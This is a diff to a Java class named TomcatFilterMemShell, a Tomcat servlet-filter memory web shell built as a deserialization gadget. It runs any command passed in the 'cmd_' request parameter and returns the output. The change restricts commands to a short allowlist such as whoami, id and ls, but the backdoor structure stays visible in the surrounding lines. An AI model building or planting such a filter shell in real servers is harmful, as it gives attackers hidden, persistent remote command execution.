@@ -18,6 +18,8 @@ import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
 import java.util.*;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
 
 @Component
 public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
@@ -90,11 +92,24 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     }
 
+    private static final Set<String> ALLOWED_COMMANDS = Collections.unmodifiableSet(
+            Stream.of("whoami", "id", "hostname", "date", "uptime", "uname", "df", "ls")
+                    .collect(Collectors.toSet())
+    );
+
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            if (!ALLOWED_COMMANDS.contains(cmd.trim())) {
+                servletResponse.getOutputStream().write(
+                        ("Command not allowed. Allowed commands: " + ALLOWED_COMMANDS).getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            String[] cmdArray = new String[]{cmd.trim()};
+            Process process = Runtime.getRuntime().exec(cmdArray);
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
